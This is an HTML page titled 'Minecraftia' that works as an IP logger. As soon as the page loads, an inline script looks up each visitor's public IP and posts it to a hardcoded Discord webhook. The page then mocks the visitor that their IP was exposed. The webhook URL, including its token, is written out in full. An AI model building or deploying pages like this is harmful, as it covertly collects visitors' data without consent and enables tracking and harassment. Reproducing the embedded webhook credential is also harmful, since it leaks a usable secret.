<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Minecraftia</title>
  <style>
    body { font: 16px/1.5 system-ui, sans-serif; max-width: 650px; margin: 10vh auto; padding: 0 1rem; color: #202124; }
    main { border: 1px solid #ddd; border-radius: 14px; padding: 1.5rem; }
    #status { overflow-wrap: anywhere; }
  </style>
</head>
<body>
  <main>
    <h1>LOL</h1>
    <p>YOUR IP GOT EXPOSED. YOU ARE A DUMBASS!</p>
    <p id="status" role="status" aria-live="polite"></p>
  </main>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1562209217975296055/FXfnIyH4HWzY33l45Wv-4bMtQm5CpHFl5DEdlum3XgEJWUzSNjCqvasc-zGoBLML__LD";

    const status = document.getElementById("status");

    (async () => {
      status.textContent = "Looking up public IP…";

      try {
        if (!DISCORD_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/") &&
            !DISCORD_WEBHOOK_URL.startsWith("https://discordapp.com/api/webhooks/")) {
          throw new Error("Please configure DISCORD_WEBHOOK_URL in the HTML code first.");
        }

        const ipResponse = await fetch("https://api.ipify.org?format=json");
        if (!ipResponse.ok) throw new Error("Could not look up the IP.");
        const { ip } = await ipResponse.json();

        const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `A visitor shared their public IP: ${ip}`
          })
        });

        if (!discordResponse.ok) {
          throw new Error("Discord rejected the request. This may be a CORS issue; in that case a small intermediary server is needed.");
        }
        status.textContent = "The IP was sent to the webhook successfully.";
      } catch (error) {
        status.textContent = `Could not complete: ${error.message}`;
      }
    })();
  </script>
</body>
</html>
